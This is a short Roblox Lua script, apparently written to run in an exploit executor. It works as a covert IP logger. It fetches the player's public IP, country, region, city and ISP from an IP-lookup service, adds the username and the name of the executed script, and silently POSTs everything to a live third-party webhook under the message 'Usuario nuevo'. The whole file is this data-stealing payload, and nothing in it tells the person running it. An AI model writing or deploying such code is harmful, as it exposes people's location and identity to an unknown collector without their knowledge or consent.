local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local script_executed = _G.script_executed or "Not Found"

local function getIPInfo()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
    end)
    return success and result or {}
end

local info = getIPInfo()

local data = {
    username = player and player.Name or "Unknown",
    ip = info.ip or "Unknown",
    country = info.country_name or "Unknown",
    region = info.region or "Unknown",
    city = info.city or "Unknown",
    isp = info.org or "Unknown",
    executed_script = script_executed
}

local webhook_url = "https://l.webhook.party/hook/UhmC9lTLZKI6YMQfc9LwrwLPFzL%2BGxFO%2BstLQOE3slw9Bev78Zkfkc0IOdkr6%2Fvo45MpGmza1zthpwRkkP972KrY1Zdpp6kiK5LzyMr09xxU8%2FdybOnABAdHQG2tZZGd2Rcu9uY7DLe3YChbg7Silc9K9sYiRACjKoWOP1ntopw7zpCvqeGUaGZs5Zmiy7A%2BmKiYOe2iHdy4mH2Udl0%2FI%2FMB20D9U7pKmnbTQcKATLXml9l1oVTDeC9O3BRo%2FLrj0UbFr6BiFDgAdmuHAifBuGhQMBmY56JA%2BG2Aot8qMhpPnqVOn8Os8YKZ4N%2BRcFG7agnQWPVjwLgWJ4G2MQ3AZywHy47Kz4ONmhkx150FbG4XZdGZxcCaZsDAz4xm%2FQG8XRi4GWRkPKw%3D/ViaTuzjhjElC6x2r"

pcall(function()
    (request or http_request or http and http.request)({
        Url = webhook_url,
        Method = "POST",
        Body = HttpService:JSONEncode({content = "**Usuario nuevo**\n```json\n" .. HttpService:JSONEncode(data) .. "\n```"}),
        Headers = {["content-type"] = "application/json"}
    })
end)